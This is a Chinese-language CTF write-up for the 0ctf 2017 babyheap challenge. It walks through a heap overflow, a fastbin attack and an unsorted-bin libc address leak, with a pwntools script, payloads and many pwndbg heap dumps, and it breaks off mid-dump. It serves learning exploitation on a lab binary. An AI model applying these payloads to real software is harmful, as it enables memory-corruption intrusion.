<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">show</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = get_number();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印idx的块内容</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
<p>使用两次double free与fastbin attack，通过unsorted bin的特性，若unsorted bin中只有一个chunk的时候，这个chunk的fd和bk指针存放的都是main_arena+88,我们可以这获得libc的基地址</p>
<h5 id="获取libc的基址"><a href="#获取libc的基址" class="headerlink" title="获取libc的基址"></a>获取libc的基址</h5><p>libc的基址通过unsorted bin的特性获得，只要申请一块较大的chunk，并free掉，该chunk的fd和bk地址便可用来计算。因此我们要获得被free掉的chunk内容，而dump函数就算输出chunk内容。因此要使得两个指针指向同一个较大的chunk块，将其中一个指针chunk释放，另一个使用dump获取地址内存</p>
<h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><h5 id="根据题目情况构造好交互函数"><a href="#根据题目情况构造好交互函数" class="headerlink" title="根据题目情况构造好交互函数"></a>根据题目情况构造好交互函数</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>

<h5 id="首先申请初始块"><a href="#首先申请初始块" class="headerlink" title="首先申请初始块"></a>首先申请初始块</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0 方便修改第1，2块</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3 方便修改0x80堆块</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>



<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-06 105316.png)</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-04-06 110020.png)</p>
<p>这里遇到了些许版本问题，因为2.23libc版本中没有tcachebins，但是我的ubuntu的libc版本是2.26的，所以本地动态调试的时候会出现不同.于是我就学习了一下怎样更换elf文件的glibc，这里简单记一下，需要的两个工具：patchelf和glibc-all-in-one</p>
<blockquote>
<p>安装完毕后，首先使用glibc-all-in-one现在题目对应的gilbc</p>
<p>.&#x2F;download (cat list后所显示的gilbc各种版本中所需要的版本)</p>
<p>下载好的glibc在lib文件夹中，然后复制ld文件到pwn题目录下,此命令我是在题目终端下执行的,题目文件夹下面应该有这三个文件</p>
<p>然后ldd 对应题目查看glibc和ld</p>
<p>替换libc文件，设置ld文件</p>
<p>patchelf –replace-needed libc.so.6 .&#x2F;libc-2.23.so .&#x2F;babyheap_0ctf_2017<br>————————-原本的libc—-要替换的libc—–pwn文件       </p>
<p>patchelf –set-interpreter .&#x2F;ld-2.23.so .&#x2F;babyheap_0ctf_2017 </p>
<p>—————————对应的ld文件—-pwn文件</p>
</blockquote>
<p>然后继续</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"><span class="comment">#2 指向块1，先进后出 为doublefree做准备</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x56052e116020</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56052e116110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/50gx 0x55c755e0d000</span><br><span class="line">0x55c755e0d000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55c755e0d070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x55c755e0d090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x55c755e0d120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55c755e0d180: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap                                   </span><br><span class="line">Allocated chunk | PREV_INUSE                   </span><br><span class="line">Addr: 0x555f4fda7000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x555f4fda7020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555f4fda7110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555f4fda7040 —▸ 0x555f4fda7020 ◂— 0x0<span class="comment">#2指向块1</span></span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx  0x555f4fda7000</span><br><span class="line">0x555f4fda7000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7050: 0x0000555f4fda7020      0x0000000000000000</span><br><span class="line">0x555f4fda7060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555f4fda7070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x555f4fda7090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda70f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x555f4fda7120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7180: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>两个free的堆块均在fastbins中</p>
<h5 id="填充2号位置，使其指向4号位置"><a href="#填充2号位置，使其指向4号位置" class="headerlink" title="填充2号位置，使其指向4号位置"></a>填充2号位置，使其指向4号位置</h5><p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload +=p8(<span class="number">0x80</span>)<span class="comment">#使2的chunk空闲块指向四号块的位置，四号块的位置为较大的chunk，用来获取目标为地址</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x557919ada000        </span><br><span class="line">0x557919ada000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada050: 0x0000557919ada080      0x0000000000000000</span><br><span class="line">0x557919ada060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x557919ada090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x557919ada120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada180: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)<span class="comment">#使四好块的大小变成了0x21，这样四号就意义上被free掉了</span></span><br></pre></td></tr></table></figure>

<p><strong>为绕过检测，修改块4：0x80-&gt;0x10，溢出实现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap     <span class="comment">#修改成功，但是由于chunk4的大小修改了，故找不到topchunk了，故后期需要把大小：0x10-&gt;0x80                                                  </span></span><br><span class="line">Allocated chunk | PREV_INUSE                                       </span><br><span class="line">Addr: 0x56359b821000                                               </span><br><span class="line">Size: 0x21                                                         </span><br><span class="line">                                                                   </span><br><span class="line">Allocated chunk | PREV_INUSE                                       </span><br><span class="line">Addr: 0x56359b821020                                               </span><br><span class="line">Size: 0x21                                                         </span><br><span class="line"><span class="comment">#2                                                                 </span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE                                 </span><br><span class="line">Addr: 0x56359b821040                                               </span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x56359b821080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56359b821060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56359b821080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56359b8210a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x56359b8210c0</span><br><span class="line">Size: 0x2100</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x56359b8231c0</span><br><span class="line">Size: 0x00</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins                                                       </span><br><span class="line">fastbins  <span class="comment">#可以看到fastbin中，二号位置已经指向了4号位置，并且4号位置大小被改为0x21                                                         </span></span><br><span class="line">0x20: 0x56359b821040 —▸ 0x56359b821080 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/50gx 0x56359b821000</span><br><span class="line">0x56359b821000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821050: 0x000056359b821080      0x0000000000000000</span><br><span class="line">0x56359b821060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821080: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210a0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b8210b0: 0x0000000000000080      0x0000000000000000</span><br><span class="line">0x56359b8210c0: 0x0000000000000000      0x0000000000002100</span><br><span class="line">0x56359b8210d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x56359b821120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821180: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="重新申请空间，将四号位置分配回来"><a href="#重新申请空间，将四号位置分配回来" class="headerlink" title="重新申请空间，将四号位置分配回来"></a>重新申请空间，将四号位置分配回来</h5><p>再申请两块0x21大小的空间，注意，申请第一个时，index&#x3D;1 为原来的2号chunk；申请第二个时，index&#x3D;2，为原来的4号chunk；但我们最终想让4号chunk再次free掉，进入unsorted bin中，因此要将4号chunk大小改回0x91，这样也能让top chunk找到。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x10</span>) <span class="comment"># 申请原本2号块 </span></span><br><span class="line">allo(<span class="number">0x10</span>)	<span class="comment"># 这里就会申请到4号块的位置</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>1、2、4</p>
<p>释放：块1-&gt;块2</p>
<p>修改：块2-&gt;块4</p>
<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
<p>故</p>
<p>原块1直接释放态-&gt;allocate态</p>
<p>原块2-&gt;idx1</p>
<p>原块4-&gt;idx2</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55cdf6b6b1c0</span><br><span class="line">Size: 0x00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>重新修改chunk4：0x10-&gt;0x80</strong></p>
<p>为了让top chunk重新找得到，故需要重新将chunk4的大小修改回0x80，以便于之后申请操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>) </span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 将4号块的大小改回 0x91,不然找不到top chunk位置 </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077020</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#new 1</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077040</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#2，4</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x559e88077000</span><br><span class="line">0x559e88077000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x559e88077090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e880770b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x559e880770c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x559e880770d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x559e88077120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>申请一个块，防止块4free与top chunk合并</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allo(0x80)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d1a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55cf4877d000</span><br><span class="line">0x55cf4877d000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d010:	0x0000000000000000	